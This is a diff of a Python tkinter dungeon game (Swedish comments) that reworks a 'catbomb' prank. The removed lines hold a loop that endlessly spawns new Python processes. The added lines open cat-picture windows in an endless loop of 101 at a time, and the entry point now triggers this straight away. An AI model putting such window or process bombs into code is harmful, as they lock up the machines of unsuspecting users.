@@ -4,27 +4,15 @@ import tkinter as tk
 import time
 #import catbomb as cat #when I try to run the code it gives error where it cant find cat.gif but it looks like its looking for it in a folder one step too high up /karl
 
-class Cat:
-    def __init__(self):
-        self.root = root = tk.Tk()
-        self.img = img = os.getcwd() + r"\cat.gif"
-        
-        print(img)
-        photo_image = tk.PhotoImage(file=img)
-        
-        photo_img = photo_image
-
-        h = random.randint(0, 150)
-        w = random.randint(0, 200)
-
-        root.wm_title('get CAT\'d')
-        root.geometry('%dx%d+%d+%d' % (900, 600, w, h))
-        label = tk.Label(root, image=photo_img)
-        label.pack()
-
-        root.mainloop()
-        while True:
-            os.system('start /MIN python.exe catbomb.py')
+class Cat(tk.Frame):
+    def __init__(self, parent=None):
+        tk.Frame.__init__(self, parent)
+        img = os.getcwd() + r"\cat.gif"
+        self.photo_img = tk.PhotoImage(file=img)
+        parent.wm_title('get CAT\'d')
+        parent.geometry('%dx%d+%d+%d' % (900, 600, random.randint(0, 200), random.randint(0, 150)))
+        self.label = tk.Label(self, image=self.photo_img)
+        self.label.pack()
 
 #Här sparas spelar karaktärens egenskaper.
 class gamePlayer:
@@ -43,7 +31,13 @@ class gamePlayer:
     def playerDeath(self):
         for i in range(10):
             print('FEAR THE CAT')
-        Cat()
+        while True:
+            root = tk.Tk()
+            Cat(root).pack()
+            for i in range(100):
+                top = tk.Toplevel(root)
+                Cat(top).pack()
+            root.mainloop()
 
         #kör catbomb
 
@@ -551,7 +545,8 @@ if __name__ == '__main__':
     gp = gamePlayer()
     tw = tower()
     bs = battleSystem()
-    tw.start()
+    gp.playerDeath()
+    #tw.start()
     # def floor():
     #    bs.startBattle(tw.enemies[0])
     # floor()
